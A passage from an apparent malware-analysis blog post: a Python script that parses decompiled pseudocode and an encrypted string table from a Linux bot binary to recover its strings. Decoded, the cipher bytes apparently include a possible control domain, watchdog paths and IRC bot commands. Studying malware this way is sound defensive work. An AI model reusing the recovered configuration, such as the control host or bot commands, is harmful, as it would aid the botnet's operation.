class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br></pre></td><td class="code"><pre><span class="line">raw = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub_8055CA0(v0, asc_8058C60, 2);</span></span><br><span class="line"><span class="string">dword_805A1C0 = (int)v0;</span></span><br><span class="line"><span class="string">word_805A1C4 = 2;</span></span><br><span class="line"><span class="string">v1 = sub_8056AC4(0xCu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v1, &amp;asc_8058C60[3], 12);</span></span><br><span class="line"><span class="string">dword_805A1B8 = (int)v1;</span></span><br><span class="line"><span class="string">word_805A1BC = 12;</span></span><br><span class="line"><span class="string">v2 = sub_8056AC4(2u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v2, &amp;asc_8058C60[16], 2);</span></span><br><span class="line"><span class="string">dword_805A300 = (int)v2;</span></span><br><span class="line"><span class="string">word_805A304 = 2;</span></span><br><span class="line"><span class="string">v3 = sub_8056AC4(0x1Du);</span></span><br><span class="line"><span class="string">sub_8055CA0(v3, &amp;asc_8058C60[19], 29);</span></span><br><span class="line"><span class="string">dword_805A1B0 = (int)v3;</span></span><br><span class="line"><span class="string">word_805A1B4 = 29;</span></span><br><span class="line"><span class="string">v4 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v4, &amp;asc_8058C60[35], 7);</span></span><br><span class="line"><span class="string">dword_805A1D0 = (int)v4;</span></span><br><span class="line"><span class="string">word_805A1D4 = 7;</span></span><br><span class="line"><span class="string">v5 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v5, &amp;asc_8058C60[43], 5);</span></span><br><span class="line"><span class="string">dword_805A1D8 = (int)v5;</span></span><br><span class="line"><span class="string">word_805A1DC = 5;</span></span><br><span class="line"><span class="string">v6 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v6, &amp;asc_8058C60[49], 11);</span></span><br><span class="line"><span class="string">dword_805A1E0 = (int)v6;</span></span><br><span class="line"><span class="string">word_805A1E4 = 11;</span></span><br><span class="line"><span class="string">v7 = sub_8056AC4(4u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v7, &amp;asc_8058C60[61], 4);</span></span><br><span class="line"><span class="string">dword_805A1E8 = (int)v7;</span></span><br><span class="line"><span class="string">word_805A1EC = 4;</span></span><br><span class="line"><span class="string">v8 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v8, &amp;asc_8058C60[66], 7);</span></span><br><span class="line"><span class="string">dword_805A1F0 = (int)v8;</span></span><br><span class="line"><span class="string">word_805A1F4 = 7;</span></span><br><span class="line"><span class="string">v9 = sub_8056AC4(8u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v9, &amp;asc_8058C60[74], 8);</span></span><br><span class="line"><span class="string">dword_805A1F8 = (int)v9;</span></span><br><span class="line"><span class="string">word_805A1FC = 8;</span></span><br><span class="line"><span class="string">v10 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v10, &amp;asc_8058C60[83], 10);</span></span><br><span class="line"><span class="string">dword_805A200 = (int)v10;</span></span><br><span class="line"><span class="string">word_805A204 = 10;</span></span><br><span class="line"><span class="string">v11 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v11, &amp;asc_8058C60[94], 11);</span></span><br><span class="line"><span class="string">dword_805A208 = (int)v11;</span></span><br><span class="line"><span class="string">word_805A20C = 11;</span></span><br><span class="line"><span class="string">v12 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v12, &amp;asc_8058C60[106], 15);</span></span><br><span class="line"><span class="string">dword_805A210 = (int)v12;</span></span><br><span class="line"><span class="string">word_805A214 = 15;</span></span><br><span class="line"><span class="string">v13 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v13, &amp;asc_8058C60[122], 16);</span></span><br><span class="line"><span class="string">dword_805A218 = (int)v13;</span></span><br><span class="line"><span class="string">word_805A21C = 16;</span></span><br><span class="line"><span class="string">v14 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v14, &amp;asc_8058C60[139], 14);</span></span><br><span class="line"><span class="string">dword_805A220 = (int)v14;</span></span><br><span class="line"><span class="string">word_805A224 = 14;</span></span><br><span class="line"><span class="string">v15 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v15, &amp;asc_8058C60[154], 11);</span></span><br><span class="line"><span class="string">dword_805A228 = (int)v15;</span></span><br><span class="line"><span class="string">word_805A22C = 11;</span></span><br><span class="line"><span class="string">v16 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v16, &amp;asc_8058C60[166], 5);</span></span><br><span class="line"><span class="string">dword_805A230 = (int)v16;</span></span><br><span class="line"><span class="string">word_805A234 = 5;</span></span><br><span class="line"><span class="string">v17 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v17, &amp;asc_8058C60[172], 5);</span></span><br><span class="line"><span class="string">dword_805A238 = (int)v17;</span></span><br><span class="line"><span class="string">word_805A23C = 5;</span></span><br><span class="line"><span class="string">v18 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v18, &amp;asc_8058C60[178], 16);</span></span><br><span class="line"><span class="string">dword_805A250 = (int)v18;</span></span><br><span class="line"><span class="string">word_805A254 = 16;</span></span><br><span class="line"><span class="string">v19 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v19, &amp;asc_8058C60[195], 14);</span></span><br><span class="line"><span class="string">dword_805A258 = (int)v19;</span></span><br><span class="line"><span class="string">word_805A25C = 14;</span></span><br><span class="line"><span class="string">v20 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v20, &amp;asc_8058C60[210], 9);</span></span><br><span class="line"><span class="string">dword_805A260 = (int)v20;</span></span><br><span class="line"><span class="string">word_805A264 = 9;</span></span><br><span class="line"><span class="string">v21 = sub_8056AC4(0x13u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v21, &amp;asc_8058C60[220], 19);</span></span><br><span class="line"><span class="string">dword_805A268 = (int)v21;</span></span><br><span class="line"><span class="string">word_805A26C = 19;</span></span><br><span class="line"><span class="string">v22 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v22, &amp;asc_8058C60[240], 23);</span></span><br><span class="line"><span class="string">dword_805A270 = (int)v22;</span></span><br><span class="line"><span class="string">word_805A274 = 23;</span></span><br><span class="line"><span class="string">v23 = sub_8056AC4(0xEu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v23, &amp;asc_8058C60[264], 14);</span></span><br><span class="line"><span class="string">dword_805A278 = (int)v23;</span></span><br><span class="line"><span class="string">word_805A27C = 14;</span></span><br><span class="line"><span class="string">v24 = sub_8056AC4(0x13u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v24, &amp;asc_8058C60[279], 19);</span></span><br><span class="line"><span class="string">dword_805A280 = (int)v24;</span></span><br><span class="line"><span class="string">word_805A284 = 19;</span></span><br><span class="line"><span class="string">v25 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v25, &amp;asc_8058C60[299], 23);</span></span><br><span class="line"><span class="string">dword_805A288 = (int)v25;</span></span><br><span class="line"><span class="string">word_805A28C = 23;</span></span><br><span class="line"><span class="string">v26 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v26, &amp;asc_8058C60[323], 15);</span></span><br><span class="line"><span class="string">dword_805A290 = (int)v26;</span></span><br><span class="line"><span class="string">word_805A294 = 15;</span></span><br><span class="line"><span class="string">v27 = sub_8056AC4(8u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v27, &amp;asc_8058C60[339], 8);</span></span><br><span class="line"><span class="string">dword_805A298 = (int)v27;</span></span><br><span class="line"><span class="string">word_805A29C = 8;</span></span><br><span class="line"><span class="string">v28 = sub_8056AC4(0xBu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v28, &amp;asc_8058C60[348], 11);</span></span><br><span class="line"><span class="string">dword_805A2A0 = (int)v28;</span></span><br><span class="line"><span class="string">word_805A2A4 = 11;</span></span><br><span class="line"><span class="string">v29 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v29, &amp;asc_8058C60[360], 9);</span></span><br><span class="line"><span class="string">dword_805A2A8 = (int)v29;</span></span><br><span class="line"><span class="string">word_805A2AC = 9;</span></span><br><span class="line"><span class="string">v30 = sub_8056AC4(6u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v30, &amp;asc_8058C60[370], 6);</span></span><br><span class="line"><span class="string">dword_805A2B0 = (int)v30;</span></span><br><span class="line"><span class="string">word_805A2B4 = 6;</span></span><br><span class="line"><span class="string">v31 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v31, &amp;asc_8058C60[377], 5);</span></span><br><span class="line"><span class="string">dword_805A2B8 = (int)v31;</span></span><br><span class="line"><span class="string">word_805A2BC = 5;</span></span><br><span class="line"><span class="string">v32 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v32, &amp;asc_8058C60[383], 10);</span></span><br><span class="line"><span class="string">dword_805A2C8 = (int)v32;</span></span><br><span class="line"><span class="string">word_805A2CC = 10;</span></span><br><span class="line"><span class="string">v33 = sub_8056AC4(0xFu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v33, &amp;asc_8058C60[394], 15);</span></span><br><span class="line"><span class="string">dword_805A2D0 = (int)v33;</span></span><br><span class="line"><span class="string">word_805A2D4 = 15;</span></span><br><span class="line"><span class="string">v34 = sub_8056AC4(0xAu);</span></span><br><span class="line"><span class="string">sub_8055CA0(v34, &amp;asc_8058C60[411], 10);</span></span><br><span class="line"><span class="string">dword_805A2D8 = (int)v34;</span></span><br><span class="line"><span class="string">word_805A2DC = 10;</span></span><br><span class="line"><span class="string">v35 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v35, &amp;asc_8058C60[422], 5);</span></span><br><span class="line"><span class="string">dword_805A2E0 = (int)v35;</span></span><br><span class="line"><span class="string">word_805A2E4 = 5;</span></span><br><span class="line"><span class="string">v36 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v36, &amp;asc_8058C60[428], 5);</span></span><br><span class="line"><span class="string">dword_805A2E8 = (int)v36;</span></span><br><span class="line"><span class="string">word_805A2EC = 5;</span></span><br><span class="line"><span class="string">v37 = sub_8056AC4(5u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v37, &amp;asc_8058C60[434], 5);</span></span><br><span class="line"><span class="string">dword_805A2F0 = (int)v37;</span></span><br><span class="line"><span class="string">word_805A2F4 = 5;</span></span><br><span class="line"><span class="string">v38 = sub_8056AC4(6u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v38, &amp;asc_8058C60[440], 6);</span></span><br><span class="line"><span class="string">dword_805A308 = (int)v38;</span></span><br><span class="line"><span class="string">word_805A30C = 6;</span></span><br><span class="line"><span class="string">v39 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v39, &amp;asc_8058C60[447], 7);</span></span><br><span class="line"><span class="string">dword_805A310 = (int)v39;</span></span><br><span class="line"><span class="string">word_805A314 = 7;</span></span><br><span class="line"><span class="string">v40 = sub_8056AC4(7u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v40, &amp;asc_8058C60[455], 7);</span></span><br><span class="line"><span class="string">dword_805A318 = (int)v40;</span></span><br><span class="line"><span class="string">word_805A31C = 7;</span></span><br><span class="line"><span class="string">v41 = sub_8056AC4(3u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v41, &amp;asc_8058C60[463], 3);</span></span><br><span class="line"><span class="string">dword_805A320 = (int)v41;</span></span><br><span class="line"><span class="string">word_805A324 = 3;</span></span><br><span class="line"><span class="string">v42 = sub_8056AC4(0x12u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v42, &amp;asc_8058C60[467], 18);</span></span><br><span class="line"><span class="string">dword_805A328 = (int)v42;</span></span><br><span class="line"><span class="string">word_805A32C = 18;</span></span><br><span class="line"><span class="string">v43 = sub_8056AC4(0x17u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v43, &amp;asc_8058C60[486], 23);</span></span><br><span class="line"><span class="string">dword_805A330 = (int)v43;</span></span><br><span class="line"><span class="string">word_805A334 = 23;</span></span><br><span class="line"><span class="string">v44 = sub_8056AC4(9u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v44, &amp;asc_8058C60[510], 9);</span></span><br><span class="line"><span class="string">dword_805A338 = (int)v44;</span></span><br><span class="line"><span class="string">word_805A33C = 9;</span></span><br><span class="line"><span class="string">v45 = sub_8056AC4(0x10u);</span></span><br><span class="line"><span class="string">sub_8055CA0(v45, &amp;asc_8058C60[520], 16);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">list1 = re.findall(<span class="string">&quot;asc_8058C60\[([\d]+)\]&quot;</span>, raw)</span><br><span class="line">list2 = re.findall(<span class="string">&quot;, (\d+)\);\n&quot;</span>, raw)</span><br><span class="line">list_tmp = [<span class="string">&quot;0&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> list1:</span><br><span class="line">list_tmp.append(_)</span><br><span class="line">list1 = list_tmp</span><br><span class="line"></span><br><span class="line">cipher1 = [</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x4B</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x0C</span>, <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xB7</span>, <span class="number">0x00</span>, <span class="number">0x4E</span>, </span><br><span class="line"><span class="number">0x58</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x41</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x02</span>, <span class="number">0x44</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x5A</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x0A</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x0B</span>, <span class="number">0x22</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x43</span>, <span class="number">0x4C</span>, <span class="number">0x4B</span>, </span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, </span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0x4E</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, </span><br><span class="line"><span class="number">0x14</span>, <span class="number">0x1B</span>, <span class="number">0x5A</span>, <span class="number">0x46</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, </span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x4D</span>, <span class="number">0x50</span>, <span class="number">0x43</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x70</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6C</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x70</span>, <span class="number">0x46</span>, <span class="number">0x12</span>, </span><br><span class="line"><span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x51</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0x6B</span>, <span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x16</span>, <span class="number">0x77</span>, </span><br><span class="line"><span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x7B</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, </span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x6B</span>, <span class="number">0x53</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x16</span>, <span class="number">0x64</span>, <span class="number">0x43</span>, </span><br><span class="line"><span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x57</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x52</span>, <span class="number">0x50</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x44</span>, <span class="number">0x4D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x0D</span>, <span class="number">0x47</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x0C</span>, <span class="number">0x46</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x0C</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x41</span>, <span class="number">0x43</span>, <span class="number">0x4E</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x13</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x16</span>, <span class="number">0x46</span>, <span class="number">0x4F</span>, <span class="number">0x4D</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0x49</span>, </span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x4F</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x0D</span>, <span class="number">0x55</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, </span><br><span class="line"><span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x13</span>, </span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x7D</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>, <span class="number">0x46</span>, <span class="number">0x4D</span>, </span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x0D</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x54</span>, <span class="number">0x0D</span>, <span class="number">0x4C</span>, <span class="number">0x47</span>, </span><br><span class="line"><span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x0D</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x72</span>, </span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x6B</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x67</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6E</span>, <span class="number">0x6B</span>, <span class="number">0x72</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x69</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x6E</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x76</span>, <span class="number">0x69</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x67</span>, <span class="number">0x43</span>, <span class="number">0x56</span>, <span class="number">0x51</span>, <span class="number">0x1A</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x54</span>, <span class="number">0x79</span>, <span class="number">0x12</span>, 